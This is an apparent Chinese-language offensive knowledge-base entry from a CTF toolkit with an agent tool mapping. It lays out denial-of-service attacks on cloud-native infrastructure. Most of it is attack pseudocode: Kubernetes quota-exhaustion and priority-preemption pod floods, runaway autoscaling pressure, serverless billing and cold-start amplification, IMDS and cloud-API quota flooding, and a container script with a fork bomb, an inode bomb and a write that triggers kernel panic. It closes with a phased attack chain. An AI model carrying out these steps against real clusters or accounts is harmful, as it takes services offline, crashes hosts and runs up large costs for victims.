# 云原生 / 容器拒绝服务

## 场景

云原生基础设施引入了新的资源抽象层，攻击者可以利用容器编排、自动扩缩容和 Serverless 计费模型的特性，以极低成本对被攻击者造成巨大损失。

```
云环境 DoS 三叉戟:
  1. 资源配额耗尽 → K8s ResourceQuota / LimitRange 触发 → Pod 被驱逐
  2. 计费爆炸 → Serverless / 按量计费 → 账单金额飙升
  3. 自动扩缩失控 → HPA 无限扩容 → 集群资源耗尽
```

## 输入信号

- Kubernetes `ResourceQuota` 中 `requests.cpu` / `requests.memory` 使用率接近 100%
- Pod 状态 `CrashLoopBackOff` 或 `Pending` (无法调度)，Events 中 "Insufficient cpu" / "Insufficient memory"
- HPA 持续扩容至 `maxReplicas`，但目标 CPU/Memory 指标不下降 → 扩容无效
- 集群节点状态 `NotReady` 或 `DiskPressure` / `MemoryPressure`
- Pod/容器被 `OOMKilled` (exit code 137)，重启次数 `restartCount` 持续增加
- Serverless 函数 `invocations` + `duration` + `memory` 三个指标同时飙升 (计费爆炸)
- 函数 `cold_start_count` 异常高 (被故意触发冷启动 → 长计费)
- IMDS `/latest/api/token` 请求频率超过正常 1000x (SSRF 或容器内 metadata flood)
- 云账单或 Billing alert 显示 API 调用量/费用突然骤升

---

## 方法 1: Kubernetes 资源配额攻击

### 原理

利用 Pod 的资源请求和限制机制，使合法 Pod 无法调度。

```
K8s 资源管理:
  Namespace 级别 ResourceQuota:
    requests.cpu: 100
    requests.memory: 200Gi
    limits.cpu: 200
    limits.memory: 400Gi

攻击:
  1. 创建大量 Pod (CI/CD pipeline, job)
  2. 每个 Pod 声明最大 limits
  3. 达到 ResourceQuota 上限
  4. 新 Pod 无法调度 → CrashLoopBackOff
  5. 已有 Pod 也可以被抢占驱逐

驱逐链:
  Pod A (priority=0) 创建 → 触发资源不足
  → K8s scheduler 驱逐低优先级 Pod
  → 关键服务被逐出 → 服务中断
```

### 伪代码

```
function k8s_quota_attack(kubeconfig, namespace, 
                          pod_count=200, cpu_per_pod="4", mem_per_pod="8Gi"):
    """
    耗尽 K8s Namespace 的资源配额
    使合法 Pod 无法调度
    """
    
    for i in range(pod_count):
        pod_manifest = {
            "apiVersion": "v1",
            "kind": "Pod",
            "metadata": {
                "name": f"resource-bomb-{i}",
                "namespace": namespace,
                "labels": {"app": f"bomb-{i}"}
            },
            "spec": {
                "containers": [{
                    "name": "sleeper",
                    "image": "busybox:latest",
                    "command": ["sleep", "3600"],  # 睡 1 小时
                    "resources": {
                        "requests": {
                            "cpu": cpu_per_pod,
                            "memory": mem_per_pod
                        },
                        "limits": {
                            "cpu": cpu_per_pod,
                            "memory": mem_per_pod
                        }
                    }
                }]
            }
        }
        
        k8s_create_pod(kubeconfig, pod_manifest)
        
        if i % 20 == 0:
            quota = k8s_get_resource_quota(kubeconfig, namespace)
            used_pct = quota.used.cpu / quota.hard.cpu * 100
            print(f"[*] {i} pods, CPU usage: {used_pct:.0f}%")
    
    # 效果:
    # 大部分资源被"睡眠" Pod 占用
    # 新部署的 Pod pending → 服务扩容失败
    # 如果有 priority class，可能还不会立刻驱逐关键 Pod
    # 但结合低 priority 和优先级抢占:
```

### K8s 优先级抢占攻击

```
# 创建大量高优先级 Pod → 抢占已有 Pod → 服务中断

def k8s_priority_preempt(kubeconfig, namespace, 
                          priority_class="system-cluster-critical"):
    """
    高优先级 Pod → 驱逐现有 Pod
    """
    
    for i in range(50):
        pod = {
            "spec": {
                "priorityClassName": priority_class,  # 最高优先级
                "containers": [{
                    "name": "killer",
                    "image": "busybox",
                    "command": ["sleep", "3600"],
                    "resources": {
                        "requests": {"cpu": "8", "memory": "32Gi"}
                    }
                }]
            }
        }
        k8s_create_pod(kubeconfig, pod)
    
    # 调度器自动驱逐低优先级 Pod 为新 Pod 腾空间
    # 关键服务被逐出 → PDB (PodDisruptionBudget) 可能阻止
    # 但如果攻击 Pod 声明比 PDB 更高的 minAvailable → 矛盾
```

## 方法 2: HPA 无限扩容 (AutoScaling DoS)

### 原理

利用 Horizontal Pod Autoscaler 的触发器，导致无限扩容耗尽集群资源。

```
HPA 逻辑:
  targetCPUUtilizationPercentage: 50
  如果 avg CPU > 50% → 扩容
  如果 avg CPU < 50% → 缩容

攻击:
  1. 给已有 Deployment 施加 CPU/内存 压力
  2. HPA 检测到指标超标 → 扩容
  3. 新 Pod 分摊流量 → 攻击者加大压力
  4. HPA 继续扩容 → 不设上限 → 无限扩容
  5. 集群节点资源耗尽 → 节点 NotReady
  6. 需要手动干预缩容 → 操作窗口期服务不可用

更狠: 对多个 Deployment 同时施压 → 争抢集群剩余资源
```

### 伪代码

```
function hpa_infinite_scale(target_url, deployment_name, duration_sec=600):
    """
    触发 HPA 无限扩容
    
    原理:
      - 目标 service 的 CPU 被攻击流量打高
      - HPA 扩容 Pod 分摊
      - 攻击者自适应提高压力维持高 CPU
      - HPA 持续扩容直到 maxReplicas 或集群满
    """
    
    # 1. 获取当前 HPA 配置
    hpa = k8s_get_hpa(deployment_name)
    max_replicas = hpa.maxReplicas  # 可能未设置 → 无上限
    current_replicas = hpa.currentReplicas
    
    print(f"[*] HPA: current={current_replicas}, max={max_replicas}")
    
    # 2. 自适应压力控制
    # 目标: 保持 CPU 在 80%+ → HPA 持续触发扩容
    
    base_rate = 100  # 初始 qps
    rate = base_rate
    
    deadline = now() + duration_sec
    while now() < deadline:
        # 发送请求
        spawn_requests(target_url, rate)
        
        sleep(10)  # 等待 HPA 检测周期
        
        # 检查当前 Pod 数量
        replicas = k8s_get_replicas(deployment_name)
        print(f"[*] Replicas: {replicas}, rate: {rate}")
        
        # 自适应: 如果 Pod 多了，提高速率维持每 Pod 高负载
        rate = base_rate * replicas * 1.5
        
        # 如果达到 maxReplicas → 所有 Pod 满负荷 → 服务降级
        if max_replicas and replicas >= max_replicas:
            print("[!] Max replicas reached, holding pressure...")
            # 维持压力 → 所有 Pod 挂 → 服务不可用
```

## 方法 3: Serverless 计费爆炸

### 原理

Serverless (Lambda/Functions/Cloud Run) 按调用次数和资源时间计费。攻击者可以制造巨额账单。

```
计费模型:
  AWS Lambda:
    $0.20 per 1M requests
    $0.0000166667 per GB-second
    1 次 128MB 持续 100ms = 0.0125 GB-s
    
攻击成本:
  1M 请求 ~$0.20
  
攻击效果:
  每秒 10000 个请求 → 每天 864M 请求 → $172.8/天 (仅请求费)
  
  如果每个请求处理 30 秒 (冷启动 + 慢逻辑):
    128MB × 30s × 864M = 3.3B GB-s → $55,000/天
  
  如果请求触发 memory=10240MB 的函数:
    成本 × 80
```

### 伪代码

```
function serverless_billing_attack(function_url, qps=1000, 
                                    payload_size_kb=100, duration_days=7):
    """
    Serverless 计费爆炸攻击
    
    原理:
      持续发送请求 → 函数被调用 → 计费
      大 payload → 更多内存/IO → 更长执行时间
      触发冷启动 → 更长计费时间
    """
    
    # 1. 构造使函数执行时间最长的请求
    # 触发冷启动: 变化 User-Agent / 参数 → 新实例反复创建
    # 触发重试: 使函数内部 retry → 多倍计费
    # 触发外部调用: 函数调用 DB/API → 等待响应时间也计费
    
    agents = ["ua-chrome", "ua-firefox", "ua-safari", ...]
    
    deadline = now() + duration_days * 86400
    count = 0
    
    while now() < deadline:
        agent = agents[count % len(agents)]  # 变化触发冷启动
        payload = random_bytes(payload_size_kb * 1024)
        
        spawn:
            http_post(function_url, body=payload, headers={
                "User-Agent": agent,
                "X-Cold-Start-Trigger": str(count),  # 确保不缓存
            })
        
        count += 1
        sleep(1 / qps)
    
    # 预期成本:
    # {count} requests × 平均执行时间 × 内存 = 巨额账单
```

### 冷启动放大

```
# 故意每条请求触发新的函数实例 (冷启动)
# 冷启动比热执行多 10-100x 计费时间

# 方法:
# 1. 每次请求变化足够多参数 → 新实例 (不同 container fingerprint)
# 2. 并发足够高 → 超出 warm pool → 冷启动
# 3. 间隔足够长 → 实例回收 → 下次冷启动

def trigger_cold_start(function_url, qps=500):
    """
    最大化冷启动频率
    """
    # AWS Lambda: warm instances 保留 ~5-15 分钟
    # 并发突发 > warm capacity → 冷启动
    
    for batch in range(1, 10000):
        # 突发并发 (全部同时到达)
        promises = []
        for i in range(200):  # 假设 warm pool 100
            promises.append(spawn(
                http_get(function_url, headers={
                    "X-Unique": random_alphanumeric(32),
                    "X-Region": random_choice(
                        ["US", "EU", "APAC", "SA"])
                })
            ))
        wait_all(promises)
        
        sleep(10)  # 间隔让实例回收
```

## 方法 4: 云 API 限频 & 元数据服务攻击

### 原理

云平台的元数据服务 (169.254.169.254) 和 API 也有速率限制。消耗这些限制可影响同一主机/Pod 上的其他服务。

```
AWS IMDSv2 限频:
  PUT /latest/api/token: 每秒不限 (但并发受 PPS 限制)
  
  攻击: 大量 token 请求 → IMDS 限频
  → 同一 EC2 上其他进程无法获取 token
  → 无法获取 IAM 临时凭证
  → 应用访问 S3/DynamoDB 失败

AWS API 限频:
  EC2 DescribeInstances: 每秒 100 次 (可调)
  
  攻击:
    如果应用调用 EC2 API 获取实例状态
    攻击者耗尽 API 配额
    → 应用的 auto-discovery / health check 失败
```

### 伪代码

```
function cloud_metadata_dos(instance_internal=False):
    """
    耗尽云实例的元数据服务或 API 配额
    """
    
    if instance_internal:
        # 1. 在容器内攻击 IMDS
        # IMDSv2: 先 PUT 获取 token，再 GET 获取数据
        for _ in range(10000):
            spawn:
                while True:
                    # 疯狂请求 token
                    http_put("http://169.254.169.254/latest/api/token",
                             headers={
                                 "X-aws-ec2-metadata-token-ttl-seconds": "21600"
                             })
    
    # 2. 消耗云 API 配额
    # 每种 API 有独立限频
    # 如果目标应用依赖某 API → 消耗该配额
    
    # 消耗 DescribeInstances:
    for _ in range(1000):
        spawn:
            aws_api_call("ec2:DescribeInstances", {})
    
    # 消耗 S3 ListObjects:
    for _ in range(1000):
        spawn:
            aws_api_call("s3:ListObjects", 
                         {"Bucket": "target-bucket", "Prefix": ""})
    
    # 消耗 KMS Decrypt:
    for _ in range(1000):
        spawn:
            aws_api_call("kms:Decrypt",
                         {"CiphertextBlob": random_bytes(256)})
```

## 方法 5: 容器逃逸资源压力

### 原理

在容器内制造极端资源压力，使其影响宿主机和其他容器。

```
容器资源隔离漏洞:

1. Fork Bomb 在容器内:
   如果未设 pid limit → 耗尽宿主 PID namespace
   → 宿主机无法 fork → 所有容器受影响
   
2. 磁盘 inode 耗尽:
   如果 volume 共享 → 耗尽宿主机 inode
   → 所有容器写入失败

3. /proc / /sys 写入:
   某些 /proc/sys/ 可写 → 修改全局内核参数
   → 影响所有容器

4. 共享内存轰炸:
   /dev/shm 无大小限制 → 写爆
   → 共享内存不足 → 依赖 shm 的应用崩溃 (PostgreSQL)

5. Ulimits 绕过:
   Docker --ulimit nofile=1024
   但某些 API 可绕过 → 创建超过限制的 fd
```

### 伪代码

```
function container_resource_escape():
    """
    容器内资源消耗 → 影响宿主机/其他容器
    
    前提: 容器配置宽松 (no PID limit, privileged, hostPID 等)
    """
    
    # 1. PID namespace 耗尽 (如果 --pids-limit 未设置)
    # kernel.pid_max = 4194303 (默认)
    # 容器内 fork 耗尽全局 PID space
    try:
        procs = []
        for i in range(100000):
            pid = os.fork()
            if pid == 0:
                sleep(3600)  # 子进程睡眠
                exit(0)
            procs.append(pid)
    except OSError:
        print(f"[!] Fork failed at {len(procs)} processes")
        # 此时宿主机也不能 fork → SSH / docker exec 全部失败
    
    # 2. 共享磁盘 inode 耗尽
    # 创建数百万零字节文件
    for i in range(1_000_000):
        open(f"/tmp/inode_bomb_{i}", "w").close()
    
    # 3. /proc/sys 写入 (如果 privileged 或某些 sysctl 可写)
    # 修改全局内核参数
    try:
        write_file("/proc/sys/kernel/panic", "1")  # 触发 kernel panic
    except PermissionError:
        # 尝试其他
        write_file("/proc/sys/net/ipv4/tcp_tw_reuse", "0")
```

## 攻击链

```
Cloud-Native DoS 综合方案:

Phase 1 — 资源配额攻击:
  1. 创建大量 Pod 消耗 ResourceQuota
  2. 触发 Priority 抢占 → 驱逐关键服务

Phase 2 — 自动扩缩失控:
  3. 施压触发 HPA 无限扩容
  4. 集群节点资源耗尽

Phase 3 — 计费爆炸:
  5. 针对 Serverless 端点
  6. 触发冷启动 + 最大内存+时间
  7. 账单数倍增长

Phase 4 — 元数据/API 阻断:
  8. 耗尽 IMDS 限频 → 凭证获取失败
  9. 耗尽云 API 配额 → 运维操作失败
```

## 参考资料

1. CVE-2019-5736 — runc container escape (resource impact on host)
2. CVE-2022-0492 — Linux kernel cgroups v1 release_agent escape (privilege → host DoS)
3. "Kubernetes Resource Quotas and Limit Ranges" — Kubernetes.io docs
4. "Container Breakouts: Examining Linux Container Vulnerabilities" — NCC Group, 2019
5. CVE-2022-23648 — containerd CRI fd exhaustion
6. "Serverless Denial of Wallet: Billing attacks on AWS Lambda" — PureSec, 2019
7. AWS Lambda Pricing & Execution Environment lifecycle (cold start amplification)
8. "Attacking Kubernetes through etcd" — WithSecure Research, 2022
9. AWS IMDSv2 Token rate limiting — AWS documentation
10. "Cloud Metadata Services: Attack & Defense" — NCC Group, 2020

## MCP 工具映射

| 步骤 | 工具 | 说明 |
|------|------|------|
| K8s 信息探测 | `http_probe` | 探测 K8s API server 及资源配置 |
| 技术搜索 | `kb_router` | 搜索 k8s / serverless / container / cloud |
| 技术查阅 | `kb_read_file` | 读取本文件 |

## 证据与验证闭环

- 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
- 将“响应差异”与服务端副作用分开记录；只有权限、状态、数据或 Flag 可重复变化才算确认。
- 从全新 session/重置状态最小化重放，记录依赖、并发参数、时间窗口及失败样本。
- 输出统一放入 `exports/ctf-website/<case>/`，凭据只用 `REDACTED` 占位，自动检索 `flag{}`、`CTF{}`、`DASCTF{}`。
